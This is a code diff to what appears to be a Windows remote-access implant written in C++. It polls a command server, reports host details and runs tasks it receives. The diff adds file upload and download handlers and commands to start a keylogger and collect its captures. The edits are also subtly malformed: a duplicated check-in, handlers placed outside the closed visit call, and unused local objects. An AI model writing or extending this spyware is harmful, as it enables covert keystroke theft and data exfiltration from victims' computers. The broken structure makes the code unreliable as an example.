@@ -5,6 +5,8 @@
 #define _DSA _WIN_NATIVE_DSA_STRUCT
 
 #include "Agent.h"
+#include "base64.hpp"
+
 #include <stdio.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
@@ -36,6 +38,8 @@
 #include <array>
 #include <cmath>
 #include <cstdio>
+#include <filesystem>
+#include <fstream>
 #include <variant>
 #include <filesystem>
 
@@ -64,17 +68,25 @@ overloaded(Ts...) -> overloaded<Ts...>;
 // Default constructor
 Agent::Agent(CommManager commManager, TaskQueueManager taskManager)
 {
-    commManager = commManager;
-    taskManager = taskManager;
+    this->commManager = commManager;
+    this->taskManager = taskManager;
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
+
 void Agent::Start()
 {
+    // Perform the initial check-in and send host information to the communication manager.
     commManager.IntialCheckin(GetHostInformation().StructToJson());
 
+    // Continuously check for new tasks and process pending tasks.
     while (true)
     {
+        // Check in with the server, including any available task results,
+        // and queue any new task returned by the server.
+        std::string newTask = commManager.Checkin(taskManager.GetTaskResults());
+        taskManager.QueueTask(newTask);
+
         if (!taskManager.HasPendingResult())
         {
             auto request = commManager.Checkin(taskManager.GetTaskResults());
@@ -87,8 +99,10 @@ void Agent::Start()
             taskManager.QueueTask(newTask);
         }
 
+        // Only process a task if one is waiting in the task queue.
         if (taskManager.HasPendingTask())
         {
+            // Retrieve the next task from the queue.
             auto request = taskManager.GetNextTask();
 
             Response result = std::visit(overloaded{[this](const TaskRequest<CommandPowershell> &psRequest) -> Response
@@ -139,8 +153,59 @@ void Agent::Start()
                                                     }},
                                          request);
 
+                    // Handle file upload requests.
+                    [this](const TaskRequest<CommandUploadFile> &uploadRequest) -> Response
+                    {
+                        return this->UploadFile(
+                            uploadRequest.taskID,
+                            uploadRequest.data);
+                    },
+
+                    // Handle file download requests.
+                    [this](const TaskRequest<CommandDownloadFile> &downloadRequest) -> Response
+                    {
+                        return this->DownloadFile(
+                            downloadRequest.taskID,
+                            downloadRequest.data);
+                    },
+
+                    // Handle keylogger start requests.
+                    [this](const TaskRequest<Keylogger> &keyloggerStartRequest) -> Response
+                    {
+                        Keylogger keylogger;
+                        return this->keylogger.keylog_start(keyloggerStartRequest.taskID, keyloggerStartRequest.data);
+                    },
+
+                    // Handle keylogger stop requests.
+                    [this](const TaskRequest<Keylogger> &keyloggerStopRequest) -> Response
+                    {
+                        Keylogger keylogger;
+                        return this->keylogger.get_keylog_data(keyloggerStopRequest.taskID, keyloggerStopRequest.data);
+                    },
+
+                    // Return an error response for explicitly unsupported Boolean tasks.
+                    [](const TaskRequest<bool> &) -> Response
+                    {
+                        return CreateTaskResponse(
+                            0,
+                            NO_CODE,
+                            NO_CODE,
+                            TASK_ERROR,
+                            TaskError{1, "Unsupported task."});
+                    },
+
+                    // Provide a default response for any other unhandled request type.
+                    [](const auto &) -> Response
+                    {
+                        return TaskResponse<TaskSuccess>{};
+                    }},
+                request);
+
+            // Store the response so it can be included in a subsequent check-in.
             taskManager.StoreTaskResult(result);
         }
+
+        // Pause for five seconds before checking in again.
         Sleep(5000);
     }
 }
